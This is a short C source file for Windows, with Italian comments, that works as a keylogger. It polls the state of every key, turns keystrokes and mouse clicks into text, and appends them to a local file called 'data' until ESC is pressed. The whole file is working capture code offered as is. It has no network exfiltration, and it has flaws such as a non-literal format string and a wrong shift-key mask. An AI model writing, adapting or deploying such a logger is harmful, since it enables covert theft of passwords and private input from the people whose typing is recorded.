#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define BUFLEN 4096

void Mapping_Key(unsigned char key_number);
int newline;
unsigned char logfile[256],string[256],buffer[BUFLEN];

void Mapping_Key(unsigned char key_number);

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int main() {
	char key,i;	
	printf("%Ricava input:\n");
	FILE *dump = fopen("data","ab+"); 
	
	
	while(1) { /* If no error is received... */
		for(i = 0; i<256; i++) {
			key = GetAsyncKeyState(i);
			// se clicco almeno un tasto da tastiera
			if(key > 0)
			{	
			 	// se clicco "ESC"
				if(i == VK_ESCAPE){
					fclose(dump);
					return 0;
				// se clicco un tasto diverso da "ESC"
				}
				// Ricavo la corrispondente descrizione del tasco premuto
				Mapping_Key(i);
				// scrivo nel file "data" , ci� che digito da tastiera
				fprintf(dump,string);
				break;
				
			}
		}
		Sleep(50);
	}				
}

void Mapping_Key(unsigned char key_number)
{
	printf("%c",key_number);
	if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */ 
	{
		if(newline) sprintf(string,"\r\n%c",key_number);
		else sprintf(string,"%c",key_number);
		newline = 0;
		return;
	}
	if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
	{
		if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000))
		{
			if(newline) sprintf(string,"\r\n%c",key_number);
			else sprintf(string,"%c",key_number);
		}
		else
		{
			if(newline) sprintf(string,"\r\n%c",key_number+0x20);
			else sprintf(string,"%c",key_number+0x20);
		}
		newline = 0;
		return;
	}
	newline = 1;
	switch(key_number) /* pulsanti del mouse */
	{
		case VK_LBUTTON: sprintf(string,"\r\n<MOUSE LEFT>");return;
		case VK_MBUTTON: sprintf(string,"\r\n<MOUSE MIDDLE>");return;
		case VK_RBUTTON: sprintf(string,"\r\n<MOUSE RIGHT>");return;
	}
	switch(key_number) /* tasti speciali */
	{
		case VK_ESCAPE: sprintf(string,"\r\n<ESC>");return;
		case VK_NEXT: sprintf(string,"\r\n<PAGDOWN>");return;
		case VK_END: sprintf(string,"\r\n<END>");return;
		case VK_PRIOR: sprintf(string,"\r\n<PAGUP>");return;
		case VK_HOME: sprintf(string,"\r\n<HOME>");return;
		case VK_LEFT: sprintf(string,"\r\n<LEFT>");return;
		case VK_UP: sprintf(string,"\r\n<UP>");return;
		case VK_RIGHT: sprintf(string,"\r\n<RIGHT>");return;
		case VK_DOWN: sprintf(string,"\r\n<DOWN>");return;
		case VK_INSERT: sprintf(string,"\r\n<INS>");return;
		case VK_DELETE: sprintf(string,"\r\n<DEL>");return;
	}
	if(key_number==VK_SPACE)
	{
		sprintf(string," ");
		newline = 0;
		return;
	}
	sprintf(string,"<?>");
	return;
}

